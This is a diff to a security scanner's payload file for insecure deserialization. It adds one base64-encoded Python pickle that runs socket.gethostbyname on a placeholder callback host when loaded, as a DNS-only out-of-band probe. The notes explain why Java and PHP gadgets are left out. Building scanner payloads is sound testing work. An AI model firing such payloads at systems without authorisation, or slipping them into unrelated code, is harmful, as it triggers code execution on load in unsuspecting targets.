@@ -2,6 +2,14 @@
   "_file_type": "injectable_payload",
   "_scanner": "deserialization",
   "_notes": "Java/Python/PHP OOB gadgets",
-  "_status": "STUB -- Week 0 scaffolding per Section 3.1; real payloads added Week 7 alongside deserialization",
-  "payloads": []
+  "_status": "PARTIAL -- Python only (docs/DECISIONS.md item 86). Real payload added Week 7 Batch 2. Schema: id, technique ('oob'), language, gadget (human-readable description + how it was verified), payload_template_b64 (base64-encoded pickle bytes with a literal 'OOB_URL_PLACEHOLDER' baked in at authoring time; substituted at the bytes level at scan time -- deserialization.py's _render_pickle_payload()). JAVA AND PHP DELIBERATELY NOT INCLUDED, not silently missing -- see deserialization.py module docstring's 'LANGUAGE COVERAGE' section: this sandbox has a JRE but no javac (cannot build+verify a custom Java gadget), and deliberately did not fetch a pre-built exploit tool (ysoserial) to work around that; PHP is not installed here, and PHP object-injection gadgets are inherently target-library-specific with no universal equivalent to Python's __reduce__. Flagged as an open gap for Waild's review (item 86), not fabricated.",
+  "payloads": [
+    {
+      "id": "python_pickle_dns_probe",
+      "technique": "oob",
+      "language": "python",
+      "gadget": "__reduce__ -> socket.gethostbyname(oob_url) -- DNS lookup only, no RCE (Section 7.16: 'No RCE gadget'). Verified end-to-end (pickle.dumps/pickletools.dis/pickle.loads round-trip against a patched _socket.gethostbyname, 3 different hostname lengths) before being stored here -- see docs/DECISIONS.md item 86.",
+      "payload_template_b64": "Y19zb2NrZXQKZ2V0aG9zdGJ5bmFtZQpwMAooVk9PQl9VUkxfUExBQ0VIT0xERVIKcDEKdHAyClJwMwou"
+    }
+  ]
 }
